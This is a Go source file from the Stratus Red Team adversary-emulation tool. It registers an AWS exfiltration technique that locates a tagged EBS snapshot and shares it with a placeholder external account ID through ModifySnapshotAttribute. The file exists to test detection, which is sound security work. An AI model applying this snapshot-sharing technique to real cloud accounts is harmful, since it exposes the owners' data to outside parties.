package aws

import (
	"context"
	_ "embed"
	"errors"
	"github.com/aws/aws-sdk-go-v2/aws"
	"github.com/aws/aws-sdk-go-v2/service/ec2"
	"github.com/aws/aws-sdk-go-v2/service/ec2/types"
	"github.com/datadog/stratus-red-team/internal/mitreattack"
	"github.com/datadog/stratus-red-team/internal/providers"
	"github.com/datadog/stratus-red-team/pkg/stratus"
	"log"
)

//go:embed main.tf
var tf []byte

func init() {
	stratus.RegisterAttackTechnique(&stratus.AttackTechnique{
		Name:                       "aws.exfiltration.ebs-snapshot-shared-with-external-account",
		Platform:                   stratus.AWS,
		MitreAttackTechnique:       []mitreattack.Tactic{mitreattack.Exfiltration},
		PrerequisitesTerraformCode: tf,
		Detonate: func(terraformOutputs map[string]string) error {
			ec2Client := ec2.NewFromConfig(providers.GetAWSProvider())

			// Find the snapshot to exfiltrate
			ourSnapshotId, err := findSnapshotId(ec2Client)
			if err != nil {
				return err
			}

			// Exfiltrate it
			log.Println("Sharing the volume snapshot with an external AWS account ID...")
			_, err = ec2Client.ModifySnapshotAttribute(context.TODO(), &ec2.ModifySnapshotAttributeInput{
				SnapshotId: aws.String(ourSnapshotId),
				Attribute:  types.SnapshotAttributeNameCreateVolumePermission,
				CreateVolumePermission: &types.CreateVolumePermissionModifications{
					Add: []types.CreateVolumePermission{{UserId: aws.String("012345678912")}},
				},
			})
			return err
		},
	})
}

// retrieves the snapshot ID of the snapshot we want to exfiltrate
func findSnapshotId(ec2Client *ec2.Client) (string, error) {
	snapshots, err := ec2Client.DescribeSnapshots(context.Background(), &ec2.DescribeSnapshotsInput{
		Filters: []types.Filter{
			{Name: aws.String("tag:StratusRedTeam"), Values: []string{"true"}},
		},
	})
	if err != nil {
		return "", err
	}
	if len(snapshots.Snapshots) == 0 {
		return "", errors.New("no EBS snapshot to exfiltrate was found")
	}
	return *snapshots.Snapshots[0].SnapshotId, nil
}
